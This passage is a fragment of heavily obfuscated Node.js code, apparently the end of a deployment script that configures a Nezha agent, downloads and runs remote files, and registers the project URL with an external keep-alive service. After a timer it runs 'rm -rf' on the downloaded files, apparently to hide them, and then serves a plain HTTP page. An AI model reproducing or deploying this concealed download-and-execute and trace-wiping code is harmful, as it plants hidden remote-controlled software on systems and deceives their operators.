NEZHA_SERVER&&NEZHA_KEY&&_0x4b0f33['push'](phpPath);process[_0x1b4a8d(0x13b)]===_0x1b4a8d(0xc4)?exec(_0x1b4a8d(0x10c)+_0x4b0f33[_0x1b4a8d(0x95)]('\x20')+_0x1b4a8d(0x123),_0x872052=>{const _0x1514bd=_0x1b4a8d;console[_0x1514bd(0x94)](),console['log'](_0x1514bd(0xf1)),console[_0x1514bd(0xd4)](_0x1514bd(0xc6));}):exec('rm\x20-rf\x20'+_0x4b0f33['join']('\x20')+_0x1b4a8d(0x9c),_0x536cc1=>{const _0x2c5696=_0x1b4a8d;console[_0x2c5696(0x94)](),console['log'](_0x2c5696(0xf1)),console[_0x2c5696(0xd4)](_0x2c5696(0xc6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x519883=_0xbd079b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x519883(0xd4)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0xa96b20=await axios[_0x519883(0x10b)](_0x519883(0xad),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x519883(0x101)}});return console[_0x519883(0xd4)](_0x519883(0xb9)),_0xa96b20;}catch(_0xb14bac){return console[_0x519883(0xf3)](_0x519883(0x145)+_0xb14bac[_0x519883(0x9a)]),null;}}async function startserver(){const _0x11f03c=_0xbd079b;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1e75d4){console[_0x11f03c(0xf3)](_0x11f03c(0xfa),_0x1e75d4);}}startserver()['catch'](_0x2c5027=>{const _0x1f7df2=_0xbd079b;console[_0x1f7df2(0xf3)](_0x1f7df2(0x102),_0x2c5027);}),app[_0xbd079b(0x122)](PORT,()=>console[_0xbd079b(0xd4)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
